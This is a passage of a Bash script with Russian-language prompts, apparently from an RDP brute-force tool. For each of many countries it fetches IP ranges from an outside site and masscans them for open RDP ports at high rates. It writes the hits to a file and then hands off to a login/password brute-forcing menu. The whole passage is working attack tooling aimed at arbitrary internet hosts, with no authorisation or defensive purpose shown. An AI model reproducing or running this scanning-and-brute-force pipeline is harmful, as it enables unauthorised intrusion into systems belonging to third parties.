echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "100" ]; then
curl http://ipdiapazon.16mb.com/Lao.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "101" ]; then
curl http://ipdiapazon.16mb.com/Latvia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 9 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "102" ]; then
curl http://ipdiapazon.16mb.com/Lebanon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "103" ]; then
curl http://ipdiapazon.16mb.com/Lesotho.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "104" ]; then
curl http://ipdiapazon.16mb.com/Libyan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "105" ]; then
curl http://ipdiapazon.16mb.com/Liechtenstein.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "106" ]; then
curl http://ipdiapazon.16mb.com/Lithuania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "107" ]; then
curl http://ipdiapazon.16mb.com/Luxembourg.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "108" ]; then
curl http://ipdiapazon.16mb.com/Macau.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "109" ]; then
curl http://ipdiapazon.16mb.com/Macedonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "110" ]; then
curl http://ipdiapazon.16mb.com/Madagascar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "111" ]; then
curl http://ipdiapazon.16mb.com/Malawi.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "112" ]; then
curl http://ipdiapazon.16mb.com/Malaysia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "113" ]; then
curl http://ipdiapazon.16mb.com/Maldives.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "114" ]; then
curl http://ipdiapazon.16mb.com/Mali.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "115" ]; then
curl http://ipdiapazon.16mb.com/Malta.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "116" ]; then
curl http://ipdiapazon.16mb.com/Mauritania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "117" ]; then
curl http://ipdiapazon.16mb.com/Mauritius.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "118" ]; then
curl http://ipdiapazon.16mb.com/Mexico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
